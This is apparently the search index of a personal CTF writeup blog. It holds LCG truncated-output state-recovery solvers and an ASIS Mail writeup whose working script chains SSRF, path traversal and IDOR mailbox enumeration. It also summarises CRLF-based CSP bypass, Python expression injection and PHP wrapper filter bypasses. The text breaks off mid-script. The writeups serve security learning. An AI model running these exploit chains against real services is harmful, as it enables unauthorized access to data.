{"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"/]+|(?!\\b)(?=[A-Z][a-z])|\\.(?!\\d)|&[lg]t;","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"CTF Writeups","text":"<p>Personal blog to keep track of the past CTF challs  ( web + some crypto / OSINT) and to share with everyone.</p>"},{"location":"#categories","title":"Categories","text":"<p>Browse by tags for quick filtering by Web/Crypto/Misc.</p>"},{"location":"#asis-ctf","title":"ASIS CTF","text":"<ul> <li> <p>Overview</p> <p>Category</p> </li> <li> <p>Sanchess</p> <p>Category: Web</p> <p>Writeup</p> </li> <li> <p>Rick Gallery</p> <p>Category: Web</p> <p>Writeup</p> </li> <li> <p>ASIS Mail</p> <p>Category: Web</p> <p>Writeup</p> </li> <li> <p>Bookmarks</p> <p>Category: Web</p> <p>Writeup</p> </li> </ul>"},{"location":"#hackday-2026","title":"HackDay 2026","text":"<ul> <li> <p>Overview</p> <p>Category</p> </li> <li> <p>As Small As Possible</p> <p>Category: Crypto</p> <p>Writeup</p> </li> <li> <p>Matrix Challenge \u2014 Steganography</p> <p>Category: Misc / Stego</p> <p>Writeup</p> </li> </ul>"},{"location":"#0xfun-ctf","title":"0xFun CTF","text":"<ul> <li> <p>Overview</p> <p>Category</p> </li> <li> <p>SwitchCaseAdvocate</p> <p>Category: Crypto</p> <p>Writeup</p> </li> <li> <p>Fortune Teller</p> <p>Category: Crypto</p> <p>Writeup</p> </li> </ul>"},{"location":"#bitsctf","title":"BITSCTF","text":"<ul> <li> <p>Overview</p> <p>Category</p> </li> <li> <p>Too Genus Curve</p> <p>Category: Crypto</p> <p>Writeup</p> </li> <li> <p>SaveMeFromThisHell \u2014 AES</p> <p>Category: Crypto</p> <p>Writeup</p> </li> </ul>"},{"location":"#hackena-ctf","title":"Hackena CTF","text":"<ul> <li> <p>Overview</p> <p>Category</p> </li> <li> <p>LWE Lattice</p> <p>Category: Crypto</p> <p>Writeup</p> </li> <li> <p>smol-web-player</p> <p>Category: Web</p> <p>Writeup</p> </li> </ul>"},{"location":"#nullcon-ctf","title":"Nullcon CTF","text":"<ul> <li> <p>Overview</p> <p>Category</p> </li> <li> <p>CatBoard</p> <p>Category: Web</p> <p>Writeup</p> </li> </ul>"},{"location":"#la-ctf","title":"LA CTF","text":"<ul> <li> <p>Overview</p> <p>Category</p> </li> <li> <p>Append Note</p> <p>Category: Web</p> <p>Writeup</p> </li> <li> <p>Bobles and Narnes</p> <p>Category: Web</p> <p>Writeup</p> </li> </ul>"},{"location":"#uoftctf","title":"UofTCTF","text":"<ul> <li> <p>Overview</p> <p>Category</p> </li> <li> <p>Lottery Challenge</p> <p>Category: Pwn / Jail</p> <p>Writeup</p> </li> </ul>"},{"location":"about/","title":"About","text":""},{"location":"about/#why-i-write-these","title":"Why I Write These","text":"<p>I started documenting CTF challenges because I kept forgetting the techniques I'd learned. After solving a challenge, I'd move on to the next one, and a few weeks later, I'd face a similar problem and have to figure it out all over again. Writing forces me to really understand what I did and why it worked.</p> <p>But it's become more than just personal notes. I've learned so much from other people's writeups over the years - those moments when someone explains a technique in a way that just clicks. If my writeups can do that for someone else, then the time spent writing them is worth it.</p>"},{"location":"about/#how-i-approach-security","title":"How I Approach Security","text":"<p>I'm interested in web application security, penetration testing, and vulnerability research. CTF competitions give me a safe, legal way to explore these topics without crossing ethical lines. There's something satisfying about that moment when you finally understand how a system can be broken - and more importantly, how it could have been built securely in the first place.</p>"},{"location":"about/#my-writing-process","title":"My Writing Process","text":"<p>When I write a writeup, I try to capture my actual thought process. Not the clean, perfect solution I came up with after the fact, but the messy reality of trying things that don't work, getting stuck, and eventually finding the path forward.</p> <p>I include all the code that actually worked - tested and functional. If I spent three hours debugging an exploit, I'll mention the common pitfalls so you don't have to waste that time too. And I only publish writeups after the CTF ends, out of respect for other competitors.</p>"},{"location":"about/#what-youll-find-here","title":"What You'll Find Here","text":"<p>Right now, the site focuses on web exploitation challenges. I've written about SSRF, XSS, CRLF injection, local file inclusion, path traversal, CSP bypasses, IDOR vulnerabilities, Python sandbox escapes, expression injection, and various filter evasion techniques.</p> <p>Each challenge taught me something specific, but the real learning comes from seeing patterns across multiple challenges. How the same vulnerability manifests in different contexts. How defensive techniques that work in one scenario fail in another.</p>"},{"location":"about/#the-site-itself","title":"The Site Itself","text":"<p>I built this site with MkDocs Material because I wanted something that was easy to maintain and looked professional without requiring a lot of fiddling. If you want to add your own writeups or suggest improvements, check out the Contributing Guide on GitHub.</p>"},{"location":"about/#get-in-touch","title":"Get in Touch","text":"<p>You can find me on GitHub at GougasseHamza. If you spot mistakes in my writeups or have suggestions, please open an issue. I'm still learning, and corrections help me improve.</p>"},{"location":"about/#legal-disclaimer","title":"Legal Disclaimer","text":"<p>Everything on this site is for educational purposes. The techniques I document are powerful and could cause real harm if misused. Only use them on systems you own or have explicit written permission to test.</p> <p>The challenges I write about are from CTF competitions - controlled environments specifically designed for security research. They exist so people like me can learn offensive security skills without breaking the law or hurting anyone.</p> <p>If you're learning from these writeups, please use that knowledge responsibly. The goal is to make systems more secure, not to break things for the sake of breaking them.</p> <p>Last updated: January 2026</p>"},{"location":"tags/","title":"Tags","text":"<p>Use this page to filter writeups by category and CTF.</p>"},{"location":"tags/#tag:0xfun","title":"0xfun","text":"<ul> <li>            Fortune Teller          </li> <li>            SwitchCaseAdvocate          </li> </ul>"},{"location":"tags/#tag:asis-ctf","title":"asis-ctf","text":"<ul> <li>            ASIS Mail          </li> <li>            Bookmarks          </li> <li>            Rick Gallery          </li> <li>            Sanchess          </li> </ul>"},{"location":"tags/#tag:bitsctf","title":"bitsctf","text":"<ul> <li>            SaveMeFromThisHell \u2014 AES          </li> <li>            Too Genus Curve          </li> </ul>"},{"location":"tags/#tag:crypto","title":"crypto","text":"<ul> <li>            As Small As Possible          </li> <li>            Fortune Teller          </li> <li>            LWE Lattice          </li> <li>            SaveMeFromThisHell \u2014 AES          </li> <li>            SwitchCaseAdvocate          </li> <li>            Too Genus Curve          </li> </ul>"},{"location":"tags/#tag:hackday2026","title":"hackday2026","text":"<ul> <li>            As Small As Possible          </li> <li>            Matrix Challenge \u2014 Steganography          </li> <li>            Trust me I'm authenticated          </li> </ul>"},{"location":"tags/#tag:hackena","title":"hackena","text":"<ul> <li>            LWE Lattice          </li> <li>            smol-web-player          </li> </ul>"},{"location":"tags/#tag:jail","title":"jail","text":"<ul> <li>            Lottery Challenge          </li> </ul>"},{"location":"tags/#tag:lactf","title":"lactf","text":"<ul> <li>            Append Note          </li> <li>            Bobles and Narnes          </li> </ul>"},{"location":"tags/#tag:misc","title":"misc","text":"<ul> <li>            Matrix Challenge \u2014 Steganography          </li> </ul>"},{"location":"tags/#tag:nullconctf","title":"nullconctf","text":"<ul> <li>            CatBoard          </li> </ul>"},{"location":"tags/#tag:pwn","title":"pwn","text":"<ul> <li>            Lottery Challenge          </li> </ul>"},{"location":"tags/#tag:stego","title":"stego","text":"<ul> <li>            Matrix Challenge \u2014 Steganography          </li> </ul>"},{"location":"tags/#tag:uoftctf","title":"uoftctf","text":"<ul> <li>            Lottery Challenge          </li> </ul>"},{"location":"tags/#tag:web","title":"web","text":"<ul> <li>            ASIS Mail          </li> <li>            Append Note          </li> <li>            Bobles and Narnes          </li> <li>            Bookmarks          </li> <li>            CatBoard          </li> <li>            Rick Gallery          </li> <li>            Sanchess          </li> <li>            Trust me I'm authenticated          </li> <li>            smol-web-player          </li> </ul>"},{"location":"0xfun/","title":"0xFun CTF","text":"<p>These are the 0xFun crypto writeups I worked through.</p>"},{"location":"0xfun/fortune-teller/","title":"Fortune Teller - LCG Truncated Output Attack","text":"<p>Category: Crypto Flag: <code>0xfun{trunc4t3d_lcg_f4lls_t0_lll}</code></p>","tags":["crypto","0xfun"]},{"location":"0xfun/fortune-teller/#challenge","title":"Challenge","text":"<p>I was given a Python script implementing a Linear Congruential Generator (LCG):</p> <pre><code>class FortuneTeller:\n    def __init__(self, seed=None):\n        self.M = 2**64\n        self.A = 2862933555777941757\n        self.C = 3037000493\n        self.state = seed if seed is not None else random.randint(1, self.M - 1)\n\n    def next(self):\n        self.state = (self.A * self.state + self.C) % self.M\n        return self.state\n\n    def glimpse(self):\n        full = self.next()\n        return full &gt;&gt; 32\n</code></pre> <p>The server gave me 3 \"glimpses\" (upper 32 bits of consecutive states) and asked me to predict the next 5 full 64-bit states.</p>","tags":["crypto","0xfun"]},{"location":"0xfun/fortune-teller/#analysis","title":"Analysis","text":"<p>The LCG follows the recurrence: <pre><code>state_{n+1} = (A * state_n + C) mod M\n</code></pre></p> <p>Where: - M = 2^64 - A = 2862933555777941757 - C = 3037000493</p> <p>The <code>glimpse()</code> function only reveals the upper 32 bits: <code>state &gt;&gt; 32</code></p> <p>This is a classic truncated LCG problem. I observed high bits but needed to recover the full state.</p>","tags":["crypto","0xfun"]},{"location":"0xfun/fortune-teller/#the-math","title":"The Math","text":"<p>Let B = 2^32. For each state: <pre><code>state_i = g_i * B + x_i    where 0 \u2264 x_i &lt; B\n</code></pre></p> <p>Here <code>g_i</code> is the known glimpse and <code>x_i</code> is the unknown lower 32 bits.</p> <p>From the LCG relation: <pre><code>state_2 = A * state_1 + C  (mod M)\ng_2 * B + x_2 = A * (g_1 * B + x_1) + C  (mod M)\n</code></pre></p> <p>Rearranging: <pre><code>A * x_1 - x_2 \u2261 g_2 * B - A * g_1 * B - C  (mod M)\nA * x_1 - x_2 \u2261 D_1  (mod M)\n</code></pre></p> <p>Where D_1 is a known constant. This gives us: <pre><code>A * x_1 = D_1 + x_2 + k * M    for some integer k\n</code></pre></p>","tags":["crypto","0xfun"]},{"location":"0xfun/fortune-teller/#solving-the-constraints","title":"Solving the Constraints","text":"<p>Since both x_1 and x_2 must be in [0, B), and A is known, I could:</p> <ol> <li>Determine valid values of k (only a few possibilities)</li> <li>For each k, find x_2 values where (D_1 + x_2 + k*M) is divisible by A</li> <li>Check if the resulting x_1 = (D_1 + x_2 + k*M) / A is in [0, B)</li> <li>Verify against the third glimpse</li> </ol> <p>The key insight is that A is large (~2^61), so very few (x_1, x_2) pairs satisfy all constraints. With 3 glimpses, I had enough constraints to uniquely determine the state.</p>","tags":["crypto","0xfun"]},{"location":"0xfun/fortune-teller/#solution","title":"Solution","text":"<pre><code>from pwn import *\n\nM = 2**64\nA = 2862933555777941757  \nC = 3037000493\nB = 2**32\n\ndef next_state(state):\n    return (A * state + C) % M\n\ndef solve(glimpses):\n    g1, g2, g3 = glimpses\n\n    T1 = A * g1 * B + C\n    D1 = g2 * B - T1\n\n    k_min = (-D1 - B + 1) // M - 1\n    k_max = (A * B - D1) // M + 1\n\n    for k in range(k_min, k_max + 1):\n        base = D1 + k * M\n        x2_lo = max(0, -base)\n        x2_hi = min(B, A * B - base)\n\n        if x2_lo &gt;= x2_hi:\n            continue\n\n        rem = (-base) % A\n        first_x2 = rem if rem &gt;= x2_lo else x2_lo + (rem - x2_lo % A) % A\n\n        for x2 in range(first_x2, x2_hi, A):\n            x1 = (base + x2) // A\n            if 0 &lt;= x1 &lt; B:\n                s1 = g1 * B + x1\n                s2 = next_state(s1)\n                if (s2 &gt;&gt; 32) == g2:\n                    s3 = next_state(s2)\n                    if (s3 &gt;&gt; 32) == g3:\n                        return s1\n    return None\n\nconn = remote('chall.0xfun.org', 59560)\ndata = conn.recvuntil(b'separated):').decode()\n\nimport re\nglimpses = [int(n) for n in re.findall(r'\\b\\d{8,10}\\b', data)[:3]]\n\nstate = solve(glimpses)\n\n# Advance past the 3 glimpses I already saw\nfor _ in range(2):\n    state = next_state(state)\n\n# Predict next 5 full states\npredictions = []\nfor _ in range(5):\n    state = next_state(state)\n    predictions.append(state)\n\nconn.sendline(' '.join(map(str, predictions)).encode())\nprint(conn.recvall().decode())\n</code></pre>","tags":["crypto","0xfun"]},{"location":"0xfun/fortune-teller/#why-it-works","title":"Why It Works","text":"<p>The flag hints at LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction), which is the standard cryptographic attack for truncated LCGs. However, for this specific case with only 32 bits hidden and 3 samples, the constraint-based approach is sufficient and faster.</p> <p>The vulnerability exists because: 1. LCG state transitions are linear 2. Knowing partial output creates a system of modular equations 3. The constraints are tight enough that brute-force over the small solution space is feasible</p>","tags":["crypto","0xfun"]},{"location":"0xfun/fortune-teller/#takeaway","title":"Takeaway","text":"<p>Never use truncated LCG output for cryptographic purposes. Even revealing only half the bits allows full state recovery with just a few samples.</p>","tags":["crypto","0xfun"]},{"location":"0xfun/switchcaseadvocate/","title":"SwitchCaseAdvocate (Fortune Teller's Revenge)","text":"<p>Category: Crypto</p> <p>Target: <code>nc chall.0xfun.org 42891</code></p> <p>I observed the service print three 32-bit \"glimpses\" (the upper 32 bits) of a 64-bit RNG state, with a large \"jump across time\" between glimpses, then ask for the next 5 full 64-bit states.</p>","tags":["crypto","0xfun"]},{"location":"0xfun/switchcaseadvocate/#given-rng","title":"Given RNG","text":"<p>From the provided script (<code>fortune_revenge(1).py</code>), I saw the Fortune Teller use a 64-bit LCG:</p> <pre><code>M = 2^64\nstate &lt;- (A * state + C) mod M\n</code></pre> <p>and a precomputed skip-ahead (\"jump\"):</p> <pre><code>state &lt;- (A_JUMP * state + C_JUMP) mod M\n</code></pre> <p>The \"glimpse\" is:</p> <pre><code>full = next()\nreturn full &gt;&gt; 32\n</code></pre> <p>So the server's three printed values are:</p> <pre><code>g1 = s1 &gt;&gt; 32, where s1 = next(seed)\ng2 = s2 &gt;&gt; 32, where s2 = next(jump(s1))\ng3 = s3 &gt;&gt; 32, where s3 = next(jump(s2))\n</code></pre> <p>Constants:</p> <pre><code>A = 2862933555777941757\nC = 3037000493\nJUMP = 100000\nA_JUMP = A^JUMP mod 2^64\nC_JUMP = 8391006422427229792\n</code></pre>","tags":["crypto","0xfun"]},{"location":"0xfun/switchcaseadvocate/#collapse-jump-next-into-one-lcg-step","title":"Collapse \"jump + next\" into one LCG step","text":"<p>Let:</p> <pre><code>f(s) = (A * s + C) mod 2^64          (next)\nj(s) = (A_JUMP * s + C_JUMP) mod 2^64 (jump)\n</code></pre> <p>One observed transition is <code>s -&gt; f(j(s))</code>, which is still affine:</p> <pre><code>f(j(s)) = A*(A_JUMP*s + C_JUMP) + C\n        = (A*A_JUMP)*s + (A*C_JUMP + C)      (mod 2^64)\n</code></pre> <p>Define the combined constants:</p> <pre><code>P = (A * A_JUMP) mod 2^64\nQ = (A * C_JUMP + C) mod 2^64\n</code></pre> <p>For this challenge:</p> <pre><code>P = 8810128861561192317\nQ = 1496106642115246093\n</code></pre> <p>So the full (hidden) 64-bit states satisfy:</p> <pre><code>s2 = (P*s1 + Q) mod 2^64\ns3 = (P*s2 + Q) mod 2^64\n</code></pre> <p>and the server reveals only:</p> <pre><code>g1 = s1 &gt;&gt; 32\ng2 = s2 &gt;&gt; 32\ng3 = s3 &gt;&gt; 32\n</code></pre>","tags":["crypto","0xfun"]},{"location":"0xfun/switchcaseadvocate/#recover-the-full-64-bit-state-with-a-232-brute-force-fast","title":"Recover the full 64-bit state with a 2^32 brute force (fast)","text":"<p>Write:</p> <pre><code>s1 = (g1 &lt;&lt; 32) | x\n</code></pre> <p>where <code>x</code> is the unknown lower 32 bits.</p> <p>Then:</p> <pre><code>s2(x) = (P*s1 + Q) mod 2^64\n      = (P*(g1&lt;&lt;32) + Q) + P*x       (mod 2^64)\n</code></pre> <p>Let <code>base = (P*(g1&lt;&lt;32) + Q) mod 2^64</code>. Instead of recomputing the multiply each time, iterate:</p> <pre><code>s2(0) = base\ns2(x+1) = (s2(x) + P) mod 2^64\n</code></pre> <p>For each <code>x</code> in <code>[0, 2^32)</code>:</p> <ol> <li>Check if <code>s2(x) &gt;&gt; 32 == g2</code>.</li> <li>If yes, compute <code>s3 = (P*s2(x) + Q) mod 2^64</code> and check <code>s3 &gt;&gt; 32 == g3</code>.</li> </ol> <p>Because matching a random 32-bit prefix happens with probability <code>1/2^32</code>, you expect about one <code>g2</code> hit in the entire loop, so only ~one expensive multiply is needed.</p> <p>Once <code>x</code> is found, you have the exact <code>s1, s2, s3</code>.</p>","tags":["crypto","0xfun"]},{"location":"0xfun/switchcaseadvocate/#predict-the-next-5-full-64-bit-states","title":"Predict the next 5 full 64-bit states","text":"<p>After the third glimpse, the challenge asks for the \"next 5 full 64-bit states\".</p> <p>Those are the next outputs of the original <code>next()</code> LCG (multiplier <code>A</code>, increment <code>C</code>) starting from the recovered <code>s3</code>:</p> <pre><code>repeat 5 times:\n  s &lt;- (A*s + C) mod 2^64\n  print s\n</code></pre>","tags":["crypto","0xfun"]},{"location":"0xfun/switchcaseadvocate/#exploit","title":"Exploit","text":"","tags":["crypto","0xfun"]},{"location":"0xfun/switchcaseadvocate/#bf_solverc-recovers-s1-s2-s3-from-g1-g2-g3","title":"<code>bf_solver.c</code> (recovers <code>s1 s2 s3</code> from <code>g1 g2 g3</code>)","text":"<pre><code>#include &lt;inttypes.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char **argv) {\n  if (argc != 4) {\n    fprintf(stderr, \"usage: %s g1 g2 g3\\n\", argv[0]);\n    return 2;\n  }\n\n  uint32_t g1 = (uint32_t)strtoul(argv[1], NULL, 10);\n  uint32_t g2 = (uint32_t)strtoul(argv[2], NULL, 10);\n  uint32_t g3 = (uint32_t)strtoul(argv[3], NULL, 10);\n\n  // Combined step constants for s' = P*s + Q (mod 2^64), where s' = next(jump(s)).\n  const uint64_t P = 8810128861561192317ull;\n  const uint64_t Q = 1496106642115246093ull;\n\n  uint64_t s1_hi = ((uint64_t)g1) &lt;&lt; 32;\n\n  // s2(x) = P*(s1_hi + x) + Q = (P*s1_hi + Q) + P*x (mod 2^64)\n  uint64_t s2 = P * s1_hi + Q; // x=0\n\n  uint64_t found_x = UINT64_MAX;\n  uint64_t found_s3 = 0;\n\n  for (uint64_t x = 0; x &lt; (1ull &lt;&lt; 32); x++) {\n    if ((uint32_t)(s2 &gt;&gt; 32) == g2) {\n      uint64_t s3 = P * s2 + Q;\n      if ((uint32_t)(s3 &gt;&gt; 32) == g3) {\n        found_x = x;\n        found_s3 = s3;\n        break;\n      }\n    }\n    s2 += P;\n  }\n\n  if (found_x == UINT64_MAX) {\n    fprintf(stderr, \"no solution found\\n\");\n    return 1;\n  }\n\n  uint64_t s1 = s1_hi | (uint32_t)found_x;\n  uint64_t s2_sol = P * s1 + Q;\n  printf(\"%\" PRIu64 \" %\" PRIu64 \" %\" PRIu64 \"\\n\", s1, s2_sol, found_s3);\n  return 0;\n}\n</code></pre> <p>Build:</p> <pre><code>gcc -O3 -march=native bf_solver.c -o bf_solver\n</code></pre>","tags":["crypto","0xfun"]},{"location":"0xfun/switchcaseadvocate/#solve_switchcasepy-gets-flag","title":"<code>solve_switchcase.py</code> (gets flag)","text":"<pre><code>#!/usr/bin/env python3\nimport socket\nimport subprocess\n\nHOST = \"chall.0xfun.org\"\nPORT = 42891\n\nMASK = (1 &lt;&lt; 64) - 1\n\n# Original LCG constants (next())\nA = 2862933555777941757\nC = 3037000493\n\ndef recv_until(sock: socket.socket, token: bytes) -&gt; bytes:\n    buf = b\"\"\n    while token not in buf:\n        chunk = sock.recv(4096)\n        if not chunk:\n            break\n        buf += chunk\n    return buf\n\ndef parse_prompt(data: bytes):\n    text = data.decode(errors=\"replace\")\n    nums = []\n    for ln in text.splitlines():\n        ln = ln.strip()\n        if ln.isdigit():\n            nums.append(int(ln))\n    if len(nums) &lt; 3:\n        raise ValueError(f\"could not parse 3 numbers: {text!r}\")\n    return nums[0], nums[1], nums[2], text\n\ndef lcg_next(x: int) -&gt; int:\n    return (A * x + C) &amp; MASK\n\ndef main():\n    with socket.create_connection((HOST, PORT), timeout=5) as s:\n        data = recv_until(s, b\":\")\n        g1, g2, g3, banner = parse_prompt(data)\n        s1, s2, s3 = map(int, subprocess.check_output(\n            [\"./bf_solver\", str(g1), str(g2), str(g3)], text=True\n        ).split())\n\n        # Predict next 5 *next()* states starting from s3.\n        preds = []\n        cur = s3\n        for _ in range(5):\n            cur = lcg_next(cur)\n            preds.append(cur)\n\n        s.sendall((\" \".join(map(str, preds)) + \"\\n\").encode())\n        print(banner, end=\"\")\n        print(s.recv(4096).decode(errors=\"replace\"), end=\"\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>","tags":["crypto","0xfun"]},{"location":"0xfun/switchcaseadvocate/#flag","title":"Flag","text":"<p><code>0xfun{r3v3ng3_0f_th3_f0rtun3_t3ll3r}</code></p>","tags":["crypto","0xfun"]},{"location":"asis-ctf/","title":"ASIS CTF","text":"<p>ASIS CTF is one of those competitions that makes you think differently about security. Run by the Academy for Skills and Information Security team, it's known for creative challenges that go beyond the typical \"find the SQL injection\" problems. When I decided to tackle some of their web challenges, I knew I was in for a learning experience.</p>"},{"location":"asis-ctf/#what-i-worked-on","title":"What I Worked On","text":"<p>I focused on the web exploitation category, where I found four challenges that each taught me something different about breaking web applications. Some were straightforward, others had me stuck for hours. But that's exactly what makes these competitions valuable - they force you to dig deeper.</p>"},{"location":"asis-ctf/#the-challenges","title":"The Challenges","text":""},{"location":"asis-ctf/#sanchess","title":"Sanchess","text":"<p>This was a Rick and Morty themed chess game that looked innocent at first. You could program Rick's moves to reach Morty on a chess board. I quickly discovered it was vulnerable to Python expression injection - I could make the server evaluate arbitrary Python code through the move conditions.</p> <p>The interesting part came when the challenge got patched mid-competition. The organizers added filters to block keywords like \"open\" and \"read\". I had to learn about Unicode normalization bypasses, using fullwidth characters that look different but evaluate the same way. It was my first time exploiting Unicode normalization, and it completely changed how I think about filter evasion.</p> <p>Read the full writeup</p>"},{"location":"asis-ctf/#rick-gallery","title":"Rick Gallery","text":"<p>An image gallery application that seemed simple enough. It had filters to prevent accessing dangerous PHP wrappers like <code>php://</code> and <code>file://</code>. The vulnerability? The filters only checked for lowercase versions of these wrappers.</p> <p>PHP's stream wrappers are case-insensitive, so <code>PHP://</code> and <code>FILE://</code> worked perfectly while bypassing all the filters. Sometimes the most effective exploits are the simplest ones. I used this to read arbitrary files on the system and eventually found the flag in <code>/tmp/flag.txt</code>.</p> <p>Read the full writeup</p>"},{"location":"asis-ctf/#asis-mail","title":"ASIS Mail","text":"<p>This was a microservices-based email application with an API, SSO service, object storage, and nginx frontend. The attack surface was large, and I had to chain multiple vulnerabilities to reach the flag.</p> <p>First, I found SSRF in the email composition endpoint. Then I discovered path traversal in the object storage service - it checked if the bucket name was \"FLAG\" but didn't sanitize the path itself. By using my own bucket with <code>../</code> to traverse to the FLAG directory, I could read protected files.</p> <p>The clever part was discovering the flag filename by exploiting an IDOR vulnerability to read other users' emails. I could see what filenames other competitors had tried, which led me to the correct flag filename.</p> <p>Read the full writeup</p>"},{"location":"asis-ctf/#bookmarks","title":"Bookmarks","text":"<p>This was the hardest one. A Flask bookmark manager that inserted the username directly into HTTP response headers. If the username contained CRLF characters (<code>\\r\\n</code>), I could inject my own headers and even inject content into the response body.</p> <p>The breakthrough came when I realized I could push the Content-Security-Policy header into the response body by ending the headers early with <code>\\r\\n\\r\\n</code>. This meant CSP wasn't enforced, and I could execute arbitrary JavaScript.</p> <p>The timing was tricky - I had to open a popup window that would load my injected script, wait for the bot to log in as the flag user, then use <code>fetch()</code> to read the dashboard using the shared session cookie. It took several attempts to get the timing right.</p> <p>Read the full writeup</p> <p>These writeups document my learning process and are shared for educational purposes.</p>"},{"location":"asis-ctf/asis-mail/","title":"ASIS Mail - Chaining Vulnerabilities","text":"<p>Category: Web Flag: <code>ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}</code></p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/asis-mail/#the-application","title":"The Application","text":"<p>ASIS Mail was a microservices-based email application - the kind of architecture that's popular in modern web development. It had multiple services working together: an nginx frontend, a Go API server, a Node.js SSO service, a Python/Flask object storage system, and PostgreSQL for the database.</p> <p>The source code was provided, which was helpful. I could see exactly how these services communicated with each other and where the security boundaries were supposed to be.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/asis-mail/#finding-the-first-vulnerability","title":"Finding the First Vulnerability","text":"<p>I started by exploring the API endpoints. The <code>/compose</code> endpoint looked interesting - it accepted XML to create email messages and could fetch attachments from URLs:</p> <pre><code>&lt;message&gt;\n    &lt;to&gt;myuser@asismail.local&lt;/to&gt;\n    &lt;subject&gt;Test&lt;/subject&gt;\n    &lt;body&gt;test content&lt;/body&gt;\n    &lt;attachment_url&gt;http://internal-service/path&lt;/attachment_url&gt;\n&lt;/message&gt;\n</code></pre> <p>This was SSRF - Server-Side Request Forgery. The API would fetch whatever URL I gave it and store the result as an attachment. But I couldn't just point it at <code>http://objectstore:8082/public/FLAG/flag.txt</code> because the object storage had checks for the FLAG bucket.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/asis-mail/#the-object-storage-vulnerability","title":"The Object Storage Vulnerability","text":"<p>Looking at the object storage code, I found something interesting:</p> <pre><code>@app.route(\"/public/&lt;bucket&gt;/&lt;path:object_name&gt;\", methods=[\"GET\"])\ndef public_file(bucket, object_name):\n    if bucket == \"FLAG\":\n        return jsonify({\"error\":\"forbidden\"}), 403\n    file_path = STORAGE / bucket / object_name\n    if not file_path.exists():\n        return jsonify({\"error\":\"not found\"}), 404\n    return send_file(file_path, as_attachment=True)\n</code></pre> <p>The code checked if the bucket name was \"FLAG\", but it didn't sanitize the <code>object_name</code> parameter. This meant I could use path traversal with <code>../</code> to escape from my bucket into the FLAG bucket.</p> <p>If I used my user ID (let's say 691) as the bucket, then: <code>/public/691/../FLAG/flag-xxx.txt</code> would resolve to <code>/data/FLAG/flag-xxx.txt</code> and bypass the check.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/asis-mail/#finding-the-flag-filename","title":"Finding the Flag Filename","text":"<p>But there was a problem: I didn't know the exact filename. According to the Dockerfile, the flag was renamed to <code>flag-&lt;md5sum&gt;.txt</code> where the MD5 was computed from the flag content itself.</p> <p>That's when I discovered another vulnerability - IDOR (Insecure Direct Object Reference) in the email access endpoint. I could read ANY user's email by just changing the email ID:</p> <pre><code>for email_id in range(1, 800):\n    resp = session.get(f\"{BASE_URL}/api/mail/{email_id}\", headers=headers)\n    # Check for attachments with flag filenames\n</code></pre> <p>By scanning other users' emails, I found they had tried various flag filenames. The most common one appearing was <code>flag-0750c96cfc2bd4b665865da15e9d5b94.txt</code>. Other competitors had obviously found the filename somehow.</p> <p>I verified it existed using the hash endpoint (which didn't have the FLAG check):</p> <pre><code>GET /files/public/x/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt/hash\nResponse: {\"content\":\"a69e461b31f79128...\",\"status\":\"ok\"}\n</code></pre> <p>Perfect. The file existed.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/asis-mail/#chaining-it-all-together","title":"Chaining It All Together","text":"<p>Now I had all the pieces: 1. SSRF in the compose endpoint 2. Path traversal in object storage 3. The correct flag filename</p> <p>I registered a new account and used the compose endpoint to fetch the flag via SSRF:</p> <pre><code>username = f\"exploit_{random_string()}\"\nsession.post(f\"{BASE_URL}/sso/register\", json={\"username\": username, \"password\": password})\nresp = session.post(f\"{BASE_URL}/sso/login\", json={\"username\": username, \"password\": password})\nuser_id = resp.json().get(\"user\", {}).get(\"userId\")\n\n# Use path traversal with my own user ID as the bucket\nssrf_url = f\"http://objectstore:8082/public/{user_id}/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt\"\n\nxml = f'''&lt;message&gt;\n    &lt;to&gt;{username}@asismail.local&lt;/to&gt;\n    &lt;subject&gt;GetFlag&lt;/subject&gt;\n    &lt;body&gt;flag&lt;/body&gt;\n    &lt;attachment_url&gt;{ssrf_url}&lt;/attachment_url&gt;\n&lt;/message&gt;'''\n\nsession.post(f\"{BASE_URL}/api/compose\", headers=headers, files={\"xml\": (None, xml)})\n</code></pre> <p>The API made the request internally (bypassing nginx restrictions), the path traversal worked, and the flag was stored as an attachment in my inbox. I retrieved it from my email:</p> <pre><code>ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}\n</code></pre>","tags":["web","asis-ctf"]},{"location":"asis-ctf/asis-mail/#the-exploit","title":"The Exploit","text":"<p>Here's the complete exploit:</p> <pre><code>#!/usr/bin/env python3\nimport requests\nimport random\nimport string\nimport time\n\nBASE_URL = \"http://91.107.143.167:8081\"\nFLAG_FILENAME = \"flag-0750c96cfc2bd4b665865da15e9d5b94.txt\"\n\ndef random_string(length=8):\n    return ''.join(random.choices(string.ascii_lowercase, k=length))\n\ndef main():\n    session = requests.Session()\n\n    # Register and login\n    username = f\"exploit_{random_string()}\"\n    password = \"ExploitPass123!\"\n\n    session.post(f\"{BASE_URL}/sso/register\", json={\"username\": username, \"password\": password})\n    resp = session.post(f\"{BASE_URL}/sso/login\", json={\"username\": username, \"password\": password})\n    data = resp.json()\n    token = data.get(\"token\")\n    user_id = data.get(\"user\", {}).get(\"userId\")\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    my_email = f\"{username}@asismail.local\"\n\n    print(f\"User: {username} (ID: {user_id})\")\n\n    # SSRF with path traversal using our own bucket\n    ssrf_url = f\"http://objectstore:8082/public/{user_id}/../FLAG/{FLAG_FILENAME}\"\n\n    xml = f'''&lt;message&gt;\n    &lt;to&gt;{my_email}&lt;/to&gt;\n    &lt;subject&gt;GetFlag&lt;/subject&gt;\n    &lt;body&gt;flag&lt;/body&gt;\n    